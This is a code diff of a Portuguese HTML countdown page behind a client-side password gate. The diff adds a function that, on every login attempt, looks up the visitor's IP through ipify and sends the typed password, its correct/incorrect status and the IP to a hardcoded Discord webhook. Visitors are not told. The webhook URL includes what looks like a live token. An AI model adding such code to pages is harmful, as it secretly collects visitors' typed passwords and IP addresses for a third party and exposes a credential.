@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <title></title>
+    <title>Acesso Protegido</title>
     <style>
         * {
             box-sizing: border-box;
@@ -29,7 +29,6 @@
 
         .container {
             display: none;
-            /* Escondido até senha correta */
             flex-wrap: wrap;
             gap: 20px;
             justify-content: center;
@@ -136,16 +135,12 @@
 
             const milissegundos = diferenca % 1000;
             diferenca = Math.floor(diferenca / 1000);
-
             const segundos = diferenca % 60;
             diferenca = Math.floor(diferenca / 60);
-
             const minutos = diferenca % 60;
             diferenca = Math.floor(diferenca / 60);
-
             const horas = diferenca % 24;
             diferenca = Math.floor(diferenca / 24);
-
             const dias = diferenca % 7;
             const semanas = Math.floor(diferenca / 7) % 4;
             const meses = Math.floor(diferenca / 30.44) % 12;
@@ -163,8 +158,32 @@
                 criarBloco(milissegundos, "Mili/s");
         }
 
-        function verificarSenha() {
+        async function enviarTentativa(senhaDigitada, status) {
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const payload = {
+                    content: `🔐 Tentativa de acesso:\n• Senha: \`${senhaDigitada}\`\n• Status: **${status}**\n• IP: \`${ip}\``
+                };
+
+                await fetch("https://discord.com/api/webhooks/1367651528554450944/flFq6ZHJPu8hasSnc10YRJH1BXPHnAtr8hZnUWZlL5-ZZ2vjt8Ynv3MAEgdzOTgl3s1s", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (erro) {
+                console.error("Erro ao enviar dados para o Webhook:", erro);
+            }
+        }
+
+        async function verificarSenha() {
             const senha = document.getElementById("senha").value;
+            const status = senha === senhaCorreta ? "CORRETA" : "INCORRETA";
+
+            await enviarTentativa(senha, status);
+
             if (senha === senhaCorreta) {
                 document.getElementById("login").style.display = "none";
                 document.getElementById("temporizador").style.display = "flex";
